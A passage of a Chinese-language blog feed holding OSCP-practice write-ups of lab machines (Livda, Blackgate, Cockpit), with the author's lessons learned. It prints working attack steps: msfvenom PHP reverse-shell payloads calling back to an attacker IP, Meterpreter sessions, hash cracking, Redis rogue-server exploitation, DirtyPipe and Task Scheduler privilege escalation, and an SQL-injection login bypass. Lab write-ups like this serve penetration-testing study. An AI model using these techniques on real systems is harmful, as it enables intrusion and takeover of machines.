class="line"><span class="number">200</span> EPRT Command successful.</span><br><span class="line"><span class="number">150</span> Opening connection for /bin/ls.</span><br><span class="line">total <span class="number">4</span></span><br><span class="line">dr-xr-xr-x   <span class="number">1</span> root     root          <span class="number">512</span> Aug <span class="number">03</span>  <span class="number">2024</span> backup</span><br><span class="line">----------   <span class="number">1</span> root     root          <span class="number">764</span> Aug <span class="number">03</span>  <span class="number">2024</span> acc<span class="punctuation">[</span>Offsec<span class="punctuation">]</span>.uac</span><br><span class="line">----------   <span class="number">1</span> root     root         <span class="number">1030</span> Aug <span class="number">03</span>  <span class="number">2024</span> acc<span class="punctuation">[</span>anonymous<span class="punctuation">]</span>.uac</span><br><span class="line">----------   <span class="number">1</span> root     root          <span class="number">926</span> Aug <span class="number">03</span>  <span class="number">2024</span> acc<span class="punctuation">[</span>admin<span class="punctuation">]</span>.uac</span><br><span class="line"><span class="number">226</span> Closing data connection.</span><br></pre></td></tr></table></figure>

<p>有admin,offsec账号<br>其他文件尝试下载都无权限<code>Access Denied</code><br>尝试admin, 弱密码admin成功登录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ftp -A <span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span></span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span>.</span><br><span class="line"><span class="number">220</span> zFTPServer v6<span class="number">.0</span><span class="punctuation">,</span> build <span class="number">2011</span><span class="number">-10</span><span class="number">-17</span> <span class="number">14</span><span class="punctuation">:</span><span class="number">25</span> ready.</span><br><span class="line">Name (<span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span><span class="punctuation">:</span>kali)<span class="punctuation">:</span> admin      </span><br><span class="line"><span class="number">331</span> User name received<span class="punctuation">,</span> need password.</span><br><span class="line">Password<span class="punctuation">:</span></span><br><span class="line"><span class="number">230</span> User logged in<span class="punctuation">,</span> proceed.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">200</span> EPRT Command successful.</span><br><span class="line"><span class="number">150</span> Opening connection for /bin/ls.</span><br><span class="line">total <span class="number">3</span></span><br><span class="line">-r--r--r--   <span class="number">1</span> root     root           <span class="number">76</span> Nov <span class="number">08</span>  <span class="number">2011</span> index.php</span><br><span class="line">-r--r--r--   <span class="number">1</span> root     root           <span class="number">45</span> Nov <span class="number">08</span>  <span class="number">2011</span> .htpasswd</span><br><span class="line">-r--r--r--   <span class="number">1</span> root     root          <span class="number">161</span> Nov <span class="number">08</span>  <span class="number">2011</span> .htaccess</span><br></pre></td></tr></table></figure>

<p>下载.htpasswd 和 index.php</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">.htpasswd内容</span><br><span class="line">offsec<span class="punctuation">:</span>$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0</span><br><span class="line"></span><br><span class="line">hashcat -h |grep apr</span><br><span class="line">   <span class="number">1600</span> | Apache $apr1$ MD5<span class="punctuation">,</span> md5apr1<span class="punctuation">,</span> MD5 (APR)                      | FTP<span class="punctuation">,</span> HTTP<span class="punctuation">,</span> SMTP<span class="punctuation">,</span> LDAP Server</span><br><span class="line">   </span><br><span class="line">hashcat -m <span class="number">1600</span> hash1 /usr/share/wordlists/rockyou.txt</span><br><span class="line">破解出密码 elite</span><br></pre></td></tr></table></figure>

<p>使用offsec：elite登录<br><img data-src="https://thiiiiink.com/202508/asynccode-99.png.png"></p>
<p>发现和index.php中内容相同</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;&lt;pre&gt;Qui e nuce nuculeum esse volt<span class="punctuation">,</span> frangit nucem!&lt;/pre&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>

<p>生成php反弹shell码</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msfvenom -p php/reverse_php LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span> LPORT=<span class="number">4444</span> -f raw -o b.php</span><br><span class="line"></span><br><span class="line">msf 反弹shell</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span> LPORT=<span class="number">4444</span> -f raw -o r.php</span><br></pre></td></tr></table></figure>

<p>通过ftp上传</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//192.168.173.46:242/r.php</span></span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//192.168.173.46:242/b.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span><span class="punctuation">]</span> <span class="number">49178</span></span><br><span class="line">whoami</span><br><span class="line">livda\apache</span><br></pre></td></tr></table></figure>

<p>msf</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">sudo msfconsole -q</span><br><span class="line"><span class="punctuation">[</span>sudo<span class="punctuation">]</span> password for kali<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Starting persistent handler(s)...</span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload  php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp)<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info<span class="punctuation">,</span> or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHost <span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span></span><br><span class="line">LHost =&gt; <span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Started reverse TCP handler on <span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span><span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span><span class="punctuation">:</span><span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span><span class="punctuation">:</span><span class="number">49168</span>) at <span class="number">2025</span><span class="number">-02</span><span class="number">-05</span> <span class="number">10</span><span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span><span class="number">58</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; sessions</span><br><span class="line">Usage<span class="punctuation">:</span> sessions <span class="punctuation">[</span>options<span class="punctuation">]</span> or sessions <span class="punctuation">[</span>id<span class="punctuation">]</span></span><br><span class="line"></span><br><span class="line">Interact with a different session ID.</span><br><span class="line"></span><br><span class="line">OPTIONS<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">    -h<span class="punctuation">,</span> --help           Show this message</span><br><span class="line">    -i<span class="punctuation">,</span> --interact &lt;id&gt;  Interact with a provided session ID</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username<span class="punctuation">:</span> apache</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    <span class="punctuation">:</span> LIVDA</span><br><span class="line">OS          <span class="punctuation">:</span> Windows NT LIVDA <span class="number">6.0</span> build <span class="number">6001</span> (Windows Server <span class="number">2008</span> Standard Edition Service Pack <span class="number">1</span>) i586</span><br><span class="line">Meterpreter <span class="punctuation">:</span> php/windows</span><br><span class="line">meterpreter &gt; ls</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>window 2008 存在 <a href="http://www.exploit-db.com/exploits/15589/">Task Scheduler Privilege Escalation</a>漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit &quot;&quot;Privilege Escalation&quot;&quot; | uniq | grep -v metasploit | grep -i &quot;&quot;windows &quot;&quot;</span><br><span class="line">Microsoft Windows - Task Scheduler Privilege Escalation                  | exploits/windows/local/15589.wsf</span><br></pre></td></tr></table></figure>

<p>脚本会添加test123用户并加入到administrator组<br><img data-src="https://thiiiiink.com/202508/asynccode-100.png.png"></p>
<p>上传到服务器上执行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">cscript .\<span class="number">15589.</span>wsf</span><br><span class="line">Microsoft (R) Windows Script Host Version <span class="number">5.7</span></span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"> Task Scheduler <span class="number">0</span> day - Privilege Escalation</span><br><span class="line"> Should work on Vista/Win7/<span class="number">2008</span> x86/x64</span><br><span class="line"> webDEViL - w3bd3vil <span class="punctuation">[</span>at<span class="punctuation">]</span> gmail <span class="punctuation">[</span>dot<span class="punctuation">]</span> com</span><br><span class="line"></span><br><span class="line">Crc32 Original<span class="punctuation">:</span> F2C9A178</span><br><span class="line">Crc32 Magic Bytes<span class="punctuation">:</span> <span class="number">0662</span>FAA1</span><br><span class="line">Crc32 Forged<span class="punctuation">:</span> F2C9A178</span><br><span class="line"></span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts for \\LIVDA</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            apache                   Guest</span><br><span class="line">test123</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>test123用户成功添加</p>
<p>通过rdp登录成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">直接登录报错</span><br><span class="line">xfreerdp /cert-ignore /u<span class="punctuation">:</span>test123 /p<span class="punctuation">:</span>test123 /v<span class="punctuation">:</span><span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">10</span><span class="punctuation">:</span><span class="number">48</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">759</span><span class="punctuation">]</span> <span class="punctuation">[</span><span class="number">13914</span><span class="punctuation">:</span><span class="number">13916</span><span class="punctuation">]</span> <span class="punctuation">[</span>ERROR<span class="punctuation">]</span><span class="punctuation">[</span>com.freerdp.core<span class="punctuation">]</span> - transport_connect_tls<span class="punctuation">:</span>freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED <span class="punctuation">[</span><span class="number">0x00020008</span><span class="punctuation">]</span></span><br><span class="line"></span><br><span class="line">需要执行sec<span class="punctuation">:</span>rdp</span><br><span class="line">xfreerdp /u<span class="punctuation">:</span>test123 /p<span class="punctuation">:</span>test123 /v<span class="punctuation">:</span><span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span> /sec<span class="punctuation">:</span>rdp</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>看到apache + php 的漏洞时尝试是对的，没成功时，应该详细看下脚本内容，确定是执行方式不正确还是不符合利用条件，不要一味瞎试浪费时间</li>
<li>zftpserver 漏洞同样，明显不能利用的不要浪费太多时间</li>
<li>admin和offsec的密码应该尝试密码爆破，如果弱密码登录不成功不能放弃，爆破出密码之后要尝试直接rdp登录</li>
<li>xfreerdp登录不成功要找原因，并且尝试其他工具如rdesktop，不能觉得是工具问题就放弃了</li>
<li>windows服务器上，winpeas和其他多个程序不能执行，要尝试其他方式，比如msf, 虽然使用msf 执行wsf脚本也失败了，最终还是直接在机器上执行</li>
<li>不要太依赖自动化信息收集工具，无法执行时，要能通过手动方式收集定时任务，系统漏洞，unquot server path、服务重启等实现提权</li>
<li>windows 系统漏洞利用需要多搜索，直接使用searchsploit 搜出来的内容太多了，需要在筛选分析<br><strong>总之，多尝试，多搜索</strong></li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Blackgate</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-35.png.png"></p>
<p>开放端口：</p>
<ul>
<li>22 </li>
<li>6379</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">edis-cli -h <span class="number">192.168</span><span class="number">.125</span><span class="number">.176</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.125</span><span class="number">.176</span><span class="punctuation">:</span><span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">redis_version<span class="punctuation">:</span><span class="number">4.0</span><span class="number">.14</span></span><br><span class="line">redis_git_sha1<span class="punctuation">:</span><span class="number">00000000</span></span><br><span class="line">redis_git_dirty<span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">redis_build_id<span class="punctuation">:</span><span class="number">25</span>b410d64d050b9e</span><br><span class="line">redis_mode<span class="punctuation">:</span>standalone</span><br><span class="line">os<span class="punctuation">:</span>Linux <span class="number">5.8</span><span class="number">.0</span><span class="number">-63</span>-generic x86_64</span><br><span class="line">arch_bits<span class="punctuation">:</span><span class="number">64</span></span><br><span class="line">multiplexing_api<span class="punctuation">:</span>epoll</span><br><span class="line">atomicvar_api<span class="punctuation">:</span>atomic-builtin</span><br><span class="line">gcc_version<span class="punctuation">:</span><span class="number">10.2</span><span class="number">.0</span></span><br><span class="line">process_id<span class="punctuation">:</span><span class="number">1700</span></span><br><span class="line">run_id<span class="punctuation">:</span><span class="number">55</span>f1eff5db87decfca36f2cdd8796002c1d3e3d2</span><br><span class="line">tcp_port<span class="punctuation">:</span><span class="number">6379</span></span><br><span class="line">uptime_in_seconds<span class="punctuation">:</span><span class="number">2697</span></span><br><span class="line">uptime_in_days<span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">hz<span class="punctuation">:</span><span class="number">10</span></span><br><span class="line">lru_clock<span class="punctuation">:</span><span class="number">9341233</span></span><br><span class="line">executable<span class="punctuation">:</span>/usr/local/bin/redis-server</span><br><span class="line">config_file<span class="punctuation">:</span></span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>尝试写&#x2F;root&#x2F;.ssh 没有权限，写crontab无权限</p>
<p>写脚本爆破用户名，得到prudence, 尝试写&#x2F;home&#x2F;prudence&#x2F;.ssh 发现没有.ssh文件夹</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">import redis</span><br><span class="line">import concurrent.futures</span><br><span class="line"></span><br><span class="line"># 在外部创建 Redis 连接</span><br><span class="line">r = redis.StrictRedis(host=&#x27;<span class="number">192.168</span><span class="number">.125</span><span class="number">.176</span>&#x27;<span class="punctuation">,</span> port=<span class="number">6379</span><span class="punctuation">,</span> db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">def set_redis_config(line)<span class="punctuation">:</span></span><br><span class="line">    dir = f<span class="string">&quot;/home/&#123;line.strip()&#125;&quot;</span></span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        ret = r.config_set(<span class="string">&quot;dir&quot;</span><span class="punctuation">,</span> dir)</span><br><span class="line">        print(f<span class="string">&quot;Successfully set config for: &#123;line.strip()&#125;&quot;</span>)</span><br><span class="line">        return ret  # 这里可以返回结果给主线程</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        # print(f<span class="string">&quot;Error setting config for &#123;line.strip()&#125;: &#123;e&#125;&quot;</span>)</span><br><span class="line">        return None  # 发生错误时返回 None</span><br><span class="line"></span><br><span class="line"># 使用线程池并行处理</span><br><span class="line">with open(&#x27;/usr/share/seclists/Usernames/Names/names.txt&#x27;<span class="punctuation">,</span> &#x27;r&#x27;) as f<span class="punctuation">:</span></span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">with concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">100</span>) as executor<span class="punctuation">:</span></span><br><span class="line">    results = executor.map(set_redis_config<span class="punctuation">,</span> lines)</span><br><span class="line"></span><br><span class="line">count  = <span class="number">1</span></span><br><span class="line"># 如果需要打印结果，可以遍历并输出</span><br><span class="line">for result in results<span class="punctuation">:</span></span><br><span class="line">    # count += <span class="number">1</span></span><br><span class="line">    # print(count</span><br><span class="line">    # )</span><br><span class="line">    if result is not None<span class="punctuation">:</span></span><br><span class="line">        print(f<span class="string">&quot;Result: &#123;result&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prudence</span><br></pre></td></tr></table></figure>

<h2 id="redis-rogue"><a href="#redis-rogue" class="headerlink" title="redis-rogue"></a>redis-rogue</h2><p>查看hits</p>
<p>利用 <a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">./redis-rogue-server.py --rhost <span class="number">192.168</span><span class="number">.125</span><span class="number">.176</span> --lhost <span class="number">192.168</span><span class="number">.45</span><span class="number">.152</span></span><br><span class="line">/home/kali/Tools/pg/blackgate/redis-rogue-server/./redis-rogue-server.py<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span> SyntaxWarning<span class="punctuation">:</span> invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  BANNER = <span class="string">&quot;&quot;</span><span class="string">&quot;______         _ _      ______                         _____</span></span><br><span class="line"><span class="string">______         _ _      ______                         _____</span></span><br><span class="line"><span class="string">| ___ \       | (_)     | ___ \                       /  ___|</span></span><br><span class="line"><span class="string">| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __</span></span><br><span class="line"><span class="string">|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ &#x27;__\ \ / / _ \ &#x27;__|</span></span><br><span class="line"><span class="string">| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |</span></span><br><span class="line"><span class="string">\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|</span></span><br><span class="line"><span class="string">                                     __/ |</span></span><br><span class="line"><span class="string">                                    |___/</span></span><br><span class="line"><span class="string">@copyright n0b0dy @ r3kapig</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[info] TARGET 192.168.125.176:6379</span></span><br><span class="line"><span class="string">[info] SERVER 192.168.45.152:21000</span></span><br><span class="line"><span class="string">[info] Setting master...</span></span><br><span class="line"><span class="string">[info] Setting dbfilename...</span></span><br></pre></td></tr></table></figure>

<p>一直卡住，换用其他exp，一样的结果，最后设置系统代理翻墙后成功获得shell</p>
<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ss linux <span class="number">5.8</span></span><br><span class="line">---------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                          |  Path</span><br><span class="line">---------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">cPanel <span class="number">5</span> &lt; <span class="number">9</span> - Local Privilege Escalation                                               | linux/local/<span class="number">24141.</span>txt</span><br><span class="line">CyberArk &lt; <span class="number">10</span> - Memory Disclosure                                                       | linux/remote/<span class="number">44829.</span>py</span><br><span class="line">CyberArk Password Vault &lt; <span class="number">9.7</span> / &lt; <span class="number">10</span> - Memory Disclosure                                | linux/dos/<span class="number">44428.</span>txt</span><br><span class="line">DenyAll WAF &lt; <span class="number">6.3</span><span class="number">.0</span> - Remote Code Execution (Metasploit)                                | linux/webapps/<span class="number">42769.</span>rb</span><br><span class="line">Elm &lt; <span class="number">2.5</span><span class="number">.8</span> - Expires Header Remote Buffer Overflow                                     | linux/remote/<span class="number">1171.</span>c</span><br><span class="line">FVWM <span class="number">2.4</span><span class="number">.17</span>/<span class="number">2.5</span><span class="number">.8</span> - fvwm_make_browse_menu.sh Scripts Command Execution                  | linux/local/<span class="number">23849.</span>txt</span><br><span class="line">GV PostScript Viewer - Remote Buffer Overflow (<span class="number">1</span>)                                       | linux/remote/<span class="number">390.</span>c</span><br><span class="line">GV PostScript Viewer - Remote Buffer Overflow (<span class="number">2</span>)                                       | linux/remote/<span class="number">400.</span>c</span><br><span class="line">JAD Java Decompiler <span class="number">1.5</span><span class="number">.8</span>e - Local Buffer Overflow                                      | linux/local/<span class="number">42076.</span>py</span><br><span class="line">JAD Java Decompiler <span class="number">1.5</span><span class="number">.8</span>e - Local Buffer Overflow (NX Enabled)                         | linux/local/<span class="number">42255.</span>py</span><br><span class="line">LibreOffice &lt; <span class="number">6.0</span><span class="number">.1</span> - &#x27;=WEBSERVICE&#x27; Remote Arbitrary File Disclosure                    | linux/remote/<span class="number">44022.</span>md</span><br><span class="line">Linux Kernel (Solaris <span class="number">10</span> / &lt; <span class="number">5.10</span> <span class="number">138888</span><span class="number">-01</span>) - Local Privilege Escalation               | solaris/local/<span class="number">15962.</span>c</span><br><span class="line">Linux Kernel <span class="number">2.4</span>/<span class="number">2.6</span> (RedHat Linux <span class="number">9</span> / Fedora Core <span class="number">4</span> &lt; <span class="number">11</span> / Whitebox <span class="number">4</span> / CentOS <span class="number">4</span>) - &#x27;s | linux/local/<span class="number">9479.</span>c</span><br><span class="line">Linux Kernel <span class="number">2.6</span><span class="number">.19</span> &lt; <span class="number">5.9</span> - &#x27;Netfilter Local Privilege Escalation                       | linux/local/<span class="number">50135.</span>c</span><br><span class="line">Linux Kernel <span class="number">4.8</span><span class="number">.0</span> UDEV &lt; <span class="number">232</span> - Local Privilege Escalation                              | linux/local/<span class="number">41886.</span>c</span><br><span class="line">Linux Kernel <span class="number">5.8</span> &lt; <span class="number">5.16</span><span class="number">.11</span> - Local Privilege Escalation (DirtyPipe)                     | linux/local/<span class="number">50808.</span>c</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下载到靶机上</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">gcc <span class="number">50808.</span>c </span><br><span class="line"></span><br><span class="line">$ ./a.out      </span><br><span class="line">Usage<span class="punctuation">:</span> ./a.out SUID</span><br><span class="line">$ ./a.out /usr/bin/su</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> hijacking suid binary..</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> dropping suid shell..</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> restoring suid binary..</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> popping root shell.. (dont forget to clean up /tmp/sh ;))</span><br><span class="line"># id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)<span class="punctuation">,</span><span class="number">1001</span>(prudence)</span><br></pre></td></tr></table></figure>

<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>官方workthrough利用redis-status的缓冲区溢出漏洞</p>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><ol>
<li>查资料的时候看到了 master-slave这种漏洞，然后检查了一下靶机redis为standalone模式，没有尝试，以为自己对redis了解的多，盲目自信，对不了解没有不愿意主动尝试，这种心态大忌</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Cockpit</title>
    <url>/post/20250215022657.html</url>
    <content><![CDATA[<h1 id="scans"><a href="#scans" class="headerlink" title="scans"></a>scans</h1><p>autorecon</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-45.png.png"></p>
<h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">- OS</span><br><span class="line">  Ubuntu <span class="number">20.04</span><span class="number">.6</span> LTS</span><br><span class="line">- ports</span><br><span class="line">- <span class="number">22</span></span><br><span class="line">  openSSH <span class="number">8.2</span></span><br><span class="line">- <span class="number">80</span></span><br><span class="line">  Apache <span class="number">2.4</span><span class="number">.41</span></span><br><span class="line">  Title<span class="punctuation">:</span> blaze</span><br><span class="line"></span><br><span class="line">  http<span class="punctuation">:</span><span class="comment">//192.168.166.10/img/</span></span><br><span class="line">  http<span class="punctuation">:</span><span class="comment">//192.168.166.10/blocked.html</span></span><br><span class="line">  http<span class="punctuation">:</span><span class="comment">//192.168.166.10/login.php</span></span><br><span class="line">  http<span class="punctuation">:</span><span class="comment">//192.168.166.10/db_config.php</span></span><br><span class="line">- <span class="number">9090</span></span><br><span class="line">  version <span class="number">2.1</span><span class="number">.4</span></span><br><span class="line">  OpenSSL <span class="number">3.3</span><span class="number">.2</span><span class="number">.3</span></span><br><span class="line">  ssl/zeus-admin?</span><br><span class="line">- things to try</span><br><span class="line">  - apache <span class="number">2.4</span><span class="number">.41</span></span><br><span class="line">  - <span class="number">80</span> admin</span><br><span class="line">  - <span class="number">9090</span> zeus-admin</span><br><span class="line">  - blaze username</span><br><span class="line">  - cockpit</span><br></pre></td></tr></table></figure>

<h2 id="22-openssh-8-2"><a href="#22-openssh-8-2" class="headerlink" title="22 openssh 8.2"></a>22 openssh 8.2</h2><p>没有已知漏洞</p>
<h2 id="80-blaze"><a href="#80-blaze" class="headerlink" title="80 blaze"></a>80 blaze</h2><p>登录192.168.166.10</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-44.png.png"></p>
<p>弱密码admin:admin&#x2F;123456&#x2F;password&#x2F;abc123 都不正确</p>
<h2 id="9090-cockpit"><a href="#9090-cockpit" class="headerlink" title="9090 cockpit"></a>9090 cockpit</h2><p>192.168.166.10:9090</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-46.png.png"></p>
<p>弱密码登录无效</p>
<p>查看源码cms: cockpit</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-42.png.png"></p>
<p>searchsploit cockpit 已知漏洞，利用不成功，搜索cockpit exploit也没有收货</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-43.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>查看hits, blaze存在sql注入漏洞，admin’ –</p>
<p>登录后得到用户和base64编码的密码</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-41.png.png"></p>
<p>解码后得到</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">james</span><br><span class="line">canttouchhhthiss@<span class="number">455152</span></span><br><span class="line"></span><br><span class="line">cameron</span><br><span class="line">thisscanttbetouchedd@<span class="number">455152</span></span><br></pre></td></tr></table></figure>

<p>使用james和密码ssh登录，发现只支持使用公私钥验证</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ssh james@<span class="number">192.168</span><span class="number">.166</span><span class="number">.10</span></span><br><span class="line">james@<span class="number">192.168</span><span class="number">.166</span><span class="number">.10</span><span class="punctuation">:</span> Permission denied (publickey).</span><br></pre></td></tr></table></figure>

<p>9090使用james登录，在账户里发现可以上传公钥</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-47.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ssh james@<span class="number">192.168</span><span class="number">.166</span><span class="number">.10</span></span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">james</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>检查进程、定时任务等没有收获，sudo -l 发现可以执行tar命令， <code>https://gtfobins.github.io/gtfobins/tar/</code>直接提权root</p>
